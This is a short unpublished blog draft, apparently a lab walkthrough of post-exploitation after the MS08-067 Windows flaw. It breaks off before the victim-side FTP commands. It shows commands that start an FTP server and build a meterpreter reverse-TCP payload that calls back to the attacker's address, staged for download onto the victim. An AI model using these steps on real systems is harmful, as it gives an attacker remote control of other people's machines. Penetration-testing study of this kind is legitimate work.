---
published: false
---


I've exploited MS08-067 without metasploit.  After exploitation I use metasploit's meterpreter.  

**Attacker**:  Start the ftp service on my attacking machine

    service pure-ftpd start

**Attacker**:  Create a payload to connect back to my attacking machine's listening meterpreter and save it to my ftp directory

    msfpayload windows/meterpreter/reverse_tcp lhost=192.168.30.36 lport=443 X > /ftphome/iambad.exe
    
**Victim**:  Exploit MS08-067 refer to 

http://dmittakarin8.github.io/Exploiting-MS08067-wo-Metasploit/

**Victim**:  FTP is installed on the server.  FTP is not interactive, so create a text file to pass to the ftp application.  I issue the following commands.  *Note the lack of spaces after the echo command*:.
